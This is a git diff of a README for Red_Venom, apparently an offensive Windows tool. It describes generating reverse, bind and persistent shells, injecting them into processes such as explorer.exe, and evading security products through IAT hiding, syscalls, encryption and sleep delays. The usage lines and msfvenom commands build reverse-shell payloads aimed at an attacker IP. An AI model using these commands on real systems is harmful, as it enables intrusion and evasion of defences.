@@ -10,36 +10,35 @@
 
 ## 📖 Overview
 
-**Red_Venom** is a terminal-based payload generation tool crafted for experienced cybersecurity professionals. Designed for educational and research purposes, it enables users to create highly evasive shellcode and deploy payloads with advanced evasion techniques. The tool supports customizable output formats, obfuscation, timed execution delays, and targeted process injection, making it a powerful resource for bypassing modern security solutions.
+**Red_Venom** is a terminal-based payload generation tool designed for experienced cybersecurity users. It is intended for educational and research purposes, allowing users to generate  shellcode and inject payloads. The tool incorporates multiple advanced evasion techniques to bypass modern security solutions, offering options for custom output formats, obfuscation, timed execution delays (sleep), and targeting specific processes.
 
 ---
 
 ## ✨ Key Features
 
-- 🔥 **Payload Generation**: Supports TCP reverse shells, bind shells, and persistent shells (EXE format only).
-- 💉 **Injection Techniques**: Includes private memory injection, API stomping, and remote process injection.
-- 🛡️ **Evasion Techniques**: Leverages IAT hiding, RC4 encryption, string hashing, syscall invocation, and sleep obfuscation.
+- 🔥 **Payload Generation**: TCP reverse shells, bind shells, and persistent shells.
+- 💉 **Injection Techniques**: Memory injection (Private/Mapped), API stomping, and process injection (Remote/Local).
+- 🛡️ **Evasion Techniques**: IAT hiding, encryption, string hashing, syscall invocation, and sleep obfuscation.
 - ⚙️ **Customization**: Configurable IP, port, sleep delays, obfuscation, target processes, and output formats (EXE, DLL).
-- 📦 **Portability**: Lightweight binary with no runtime dependencies for seamless deployment.
 
 ---
 
 ## 🔧 Supported Payload Types
 
-- **Reverse TCP**: Initiates a reverse connection from the target to the attacker's specified IP and port.
-- **Bind Shell**: Opens a listening port on the target for attacker connection (EXE format only).
+- **Reverse TCP**: Generates a TCP reverse shell, where the target initiates a connection back to the attacker.
+- **Bind Shell**: Creates a TCP bind shell, opening a listening port on the target for the attacker to connect to.
 - **Persistence Shell**: Maintains a persistent reverse shell connection (EXE format only).
 
 ---
 
 ## 💉 Supported Injection Types
 
-- **Mapping Injection**: Utilizes memory mapping techniques for payload delivery.
-- **Private Injection**: Employs private memory allocation for stealth execution.
-- **API Stomping**: Overwrites legitimate API functions for shellcode execution (EXE format only).
-- **Process Injection**: Performs local process injection (default: `explorer.exe`).
-- **Remote Process Injection**: Targets remote processes (default: `explorer.exe`).
-
+- **Mapping Injection**: Utilizes mapping memory injection techniques.
+- **Private Injection**: Employs private memory injection methods.
+- **API Stomping**: Performs local API stomping (EXE format only) to execute shellcode by overwriting legitimate API functions.
+- **Process Injection**: General local process injection capabilities.
+- **Remote Process Injection**: Facilitates remote process injection, (default: `explorer.exe`).
+  
 ---
 
 ## 🛡️ Advanced Evasion Techniques
@@ -47,10 +46,11 @@
 Red_Venom integrates cutting-edge methods to enhance payload stealth:
 
 - **IAT Hiding**: Conceals Import Address Table entries to evade API monitoring.
-- **Obfuscation**: Applies code and data obfuscation to complicate reverse engineering.
-- **RC4 Encryption**: Encrypts payloads or strings to obscure content.
+- **Obfuscation**: Applies various code and data obfuscation methods to make analysis difficult.
+- **Encryption**: Encrypts payloads or sensitive strings for obfuscation.
 - **String Hashing**: Replaces plaintext with hashes to bypass static analysis.
-- **Syscall Invocation**: Directly calls kernel functions to avoid user-mode hooks.
+- **Brute-Forcing Decryption**: (Contextual) May involve dynamic self-decryption or iterative unlocking of payload stages.
+- **Syscalls (System Calls)**: Directly invokes kernel functions, bypassing user-mode API hooks.
 - **Sleep Obfuscation**: Introduces configurable delays (via `-s` option) to evade sandbox detection.
 
 ---
@@ -66,14 +66,14 @@ Red_Venom.exe -t <Payload_Type> -i <IP> -p <Port> [options]
   ```
 ### 📋 Options
 
-- `-t <Payload_Type>`: Payload type (e.g., `Reverse_tcp`, `Bind_Shell`, `Persistence_Shell`).
-- `-i <IP>`: Target IP address for TCP payloads.
-- `-p <Port>`: Target port number for TCP payloads.
-- `-f <Payload.bin>`: Raw payload file (e.g., `msfvenom` output) for injection.
-- `-o <Format>`: Output format (e.g., `EXE`, `DLL`).
-- `-s <seconds>`: Sleep duration (default: 30.5 seconds) before execution.
-- `-obf`: Enables payload obfuscation.
-- `-r <Process>`: Target process name (e.g., `explorer.exe`) for injection.
+- `-t <Payload_Type>`: Specifies the type of payload (e.g., `Reverse_tcp`, `Mapping_Injection`).
+- `-i <IP>`: Sets the listen IP address for TCP payloads.
+- `-p <Port>`: Defines the listen port number for TCP payloads.
+- `-f <Payload.bin>`: Specifies the raw payload file (e.g., `msfvenom` output) for injection types.
+- `-o <Format>`: Determines the output format of the generated payload (EXE, DLL).
+- `-s <seconds>`: Enables sleep obfuscation, pausing execution for (30.5) seconds by default. 
+- `-obf`: Activates payload obfuscation.
+- `-r <Process>`: Specifies the remote process name for injection (e.g., `explorer.exe`).
 
 ### 📋 Example Commands
 
@@ -89,14 +89,9 @@ Red_Venom.exe -t <Payload_Type> -i <IP> -p <Port> [options]
 
 - **Inject a custom payload with obfuscation:**
   ```bash
-  Red_Venom.exe -t Private_Injection -f payload.bin -o EXE -obf -r explorer.exe
+  Red_Venom.exe -t Remote_P_Injection -f payload.bin -o EXE -obf -r explorer.exe
   ```
-
-- **Create a persistent shell with a 60-second delay:**
-  ```bash
-  Red_Venom.exe -t Persistence_Shell -i 192.168.1.100 -p 6666 -o EXE -s 60
-  ```
-
+  
 ---
 
 ## 🔄 Compatibility
@@ -104,7 +99,7 @@ Red_Venom.exe -t <Payload_Type> -i <IP> -p <Port> [options]
 Red_Venom is compatible with raw shellcode generated by tools like `msfvenom`. Example:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o payload.bin
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.bin
 ```
 
 ---
@@ -122,7 +117,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITF
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/Red_Venom.git
+   git clone https://github.com/Y-JANBOUBI/RED_VENOM.git
    ```
 
 2. **Navigate to the Project Directory**:
@@ -139,198 +134,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITF
 
 ## 📦 Pre-Compiled Binaries
 
-Pre-compiled binaries for Windows are available in the [Releases](https://github.com/YOUR_USERNAME/Red_Venom/releases) section of the repository. Download the Windows binary and follow the included instructions.
-
----
-
-## 🚫 Limitations & Future Enhancements
-
-| **Current Limitations**      | **Planned Improvements**              |
-|------------------------------|---------------------------------------|
-| Windows-only support         | Cross-platform support (Linux, macOS) |
-| Single-threaded execution    | Multi-threaded brute-force engine     |
-| Basic obfuscation            | Polymorphic and metamorphic engine    |
-| Manual syscall numbers       | Auto-generated syscall mapping        |
-
----
-
-## ⚖️ Legal & Ethical Use
-
-- **Authorized Use Only**: Deploy solely in controlled, legal environments.
-- **Prohibited Malicious Use**: Misuse may result in severe legal consequences.
-- **Compliance**: Adhere to all local laws and regulations.
-
----
-
-## 📬 Contact
-
-- **GitHub**: [github.com/YOUR_USERNAME/Red_Venom](https://github.com/YOUR_USERNAME/Red_Venom)
-- **Email**: `your.email@example.com`
-
----
-
-*Developed by Y. Janboubi. Licensed under [LICENSE_NAME].*  
-*Last Updated: July 1, 2025, 09:18 PM +01*
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Red_Venom - Advanced Payload Generation Tool
-
-![Red_Venom Security Tool](image.png)
-
-## Overview
-
-Red_Venom is a terminal-based payload generation tool designed for experienced cybersecurity users. It is intended for educational and research purposes, allowing users to generate  shellcode and inject payloads. The tool incorporates multiple advanced evasion techniques to bypass modern security solutions, offering options for custom output formats, obfuscation, timed execution delays (sleep), and targeting specific processes.
-
-> Developed by **Y. Janboubi** | Version: `1.0`  
-> ⚠️ **Disclaimer**: Red_Venom is intended strictly for educational and research purposes. Unauthorized or malicious use is prohibited.
-
----
-
-## ✨ Key Features
-
-- 🔥 **Payload Generation**: TCP reverse shell, bind shell, persistent shell (EXE only).
-- 🧬 **Injection Techniques**: Private memory injection, API stomping, remote process injection.
-- 🛡️ **Evasion Techniques**: IAT hiding, RC4 encryption, string hashing, syscall invocation.
-- ⚙️ **Customization**: Configure IP, port, sleep delays, obfuscation, target process, and output format (EXE, DLL).
-- 📦 **Portability**: Lightweight binary executable with no runtime dependencies.
-
----
-
-
-
-### Payload TCP Types:
-
-1.  **Reverse_tcp**: Generates a TCP reverse shell, where the target initiates a connection back to the attacker.
-2.  **Bind_Shell**: Creates a TCP bind shell, opening a listening port on the target for the attacker to connect to.
-3.  **Persistence_Shell**: Generates a persistent reverse shell (EXE format only) .
-
-### Payload Injection Types:
-
-4.  **Mapping_Injection**: Utilizes mapping memory injection techniques.
-5.  **Private_Injection**: Employs private memory injection methods.
-6.  **API_Stomping**: Performs local API stomping (EXE format only) to execute shellcode by overwriting legitimate API functions.
-7.  **Process_Injection**: General local process injection capabilities.
-8.  **Remote_P_Injection**: Facilitates remote process injection, defaulting to `explorer.exe`.
-
-### 🔧 Supported Techniques
-
-Red_Venom integrates cutting-edge evasion techniques to enhance payload stealth:
-
-*   **IAT Hiding**: Obscures Import Address Table entries to evade API monitoring.
-*   **Obfuscation**: Applies various code and data obfuscation methods to make analysis difficult.
-*   **Encryption**: Encrypts payloads or sensitive strings for obfuscation.
-*   **Brute-Forcing Decryption**: (Contextual) May involve dynamic self-decryption or iterative unlocking of payload stages.
-*   **String Hashing**: Replaces plaintext strings with their hash values to bypass static string scanning.
-*   **Syscalls (System Calls)**: Directly invokes kernel functions, bypassing user-mode API hooks.
-*   **Sleep Obfuscation**: Introduces timed delays (`-s` option) to evade sandbox analysis.
-
-## Usage
-
-Red_Venom is a command-line tool with various options to customize payload generation and injection.
-
-### Command-Line Options:
-
-*   `-t <Payload_Type>`: Specifies the type of payload (e.g., `Reverse_tcp`, `Mapping_Injection`).
-*   `-i <Ip>`: Sets the listen IP address for TCP payloads.
-*   `-p <Port>`: Defines the listen port number for TCP payloads.
-*   `-f <Payload.bin>`: Specifies the raw payload file (e.g., `msfvenom` output) for injection types.
-*   `-o <Format>`: Determines the output format of the generated payload (EXE, DLL).
-*   `-s`: Enables sleep obfuscation, pausing execution for 30.5 seconds by default.
-*   `-obf`: Activates payload obfuscation.
-*   `-r <Process>`: Specifies the remote process name for injection (e.g., `explorer.exe`).
-
-
-## 🚀 Usage
-
-### 🛠️ Command Syntax
-
-### Examples:
-
-*   **Generate a TCP Reverse Shell:**
-    ```bash
-    RED_VENOM.exe -t Reverse_tcp -i <LHOST> -p <LPORT> -o EXE
-    ```
-
-*   **Generate a Bind Shell:**
-    ```bash
-    RED_VENOM.exe -t Bind_Shell -p <LPORT> -o DLL
-    ```
-
-*   **Inject a Custom Payload:**
-    ```bash
-    RED_VENOM.exe -t Private_Injection -f my_shellcode.bin -o EXE
-    ```
-
-## Compatibility
-
-Red_Venom is designed to be compatible with raw shellcode generated by tools like `msfvenom`. For example, a `.bin` file generated by `msfvenom` can be used as input for injection types:
-
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port_nbr> EXITFUNC=thread -f raw -o file.bin
-```
-
-### 💡 Example Commands
-
-```bash
-# Generate TCP reverse shell with private injection
-Red_Venom.exe 1 1 -i 192.168.1.100 -p 4444 -f payload.bin -o EXE
-
-# Create a bind shell with API stomping and 30s delay
-Red_Venom.exe 2 2 -p 4444 -f payload.bin -o EXE -s 30
-
-# Obfuscated DLL payload for remote injection
-Red_Venom.exe 1 3 -i 192.168.1.100 -p 4444 -f payload.bin -o DLL -r explorer.exe -obf
-```
-
----
-
-## ⚙️ Installation
-
-### 📋 Prerequisites
-
-- C++ Compiler (`GCC` or `Clang`)
-- Windows SDK (for Windows builds)
-- `git` & `make` utilities
-
-### 🧩 Build Instructions
-
-```bash
-git clone https://github.com/YOUR_USERNAME/Red_Venom.git
-cd Red_Venom
-make
-```
-
----
-
-## 📦 Pre-Compiled Binaries
-
-Windows-ready binaries are available in the **Releases** section of the [GitHub repository](https://github.com/YOUR_USERNAME/Red_Venom). Download and run as instructed.
-
----
-
-## 🚫 Limitations & Roadmap
-
-| Current Limitations       | Planned Improvements                      |
-|---------------------------|-------------------------------------------|
-| Windows-only              | Cross-platform support (Linux/macOS)      |
-| Single-threaded BFD       | Multi-threaded brute-force engine         |
-| Basic obfuscation         | Polymorphic and metamorphic engine        |
-| Manual syscall numbers    | Auto-generated syscall mapping             |
+Pre-compiled binaries for Windows are available in the [Releases](https://github.com/Y-JANBOUBI/RED_VENOM/releases) section of the repository. Download the Windows binary and follow the included instructions.
 
 ---
 
@@ -340,18 +144,18 @@ Windows-ready binaries are available in the **Releases** section of the [GitHub 
 - **Do Not Use for Malicious Activity**
 - **Follow Local Laws and Regulations**
 
-## Disclaimer
-
-This tool is developed for **educational and research purposes only**. Any unauthorized use of Red_Venom for malicious activities is strictly prohibited and may lead to severe legal consequences. Users are responsible for ensuring their actions comply with all applicable laws and regulations.
-
 ---
 
 ## 📬 Contact
 
-- GitHub: [github.com/YOUR_USERNAME/Red_Venom](https://github.com/YOUR_USERNAME/Red_Venom)
-- Email: `your.email@example.com`
+- **GitHub**: [github.com/Y-JANBOUBI/RED_VENOM](https://github.com/Y-JANBOUBI/RED_VENOM)
+- **Email**: `your.email@example.com`
 
-## Development
+---
 
-Developed by Y.JANBOUBI V1.0
+**Developed** by Y.JANBOUBI V1.0
+
+
+
+
 
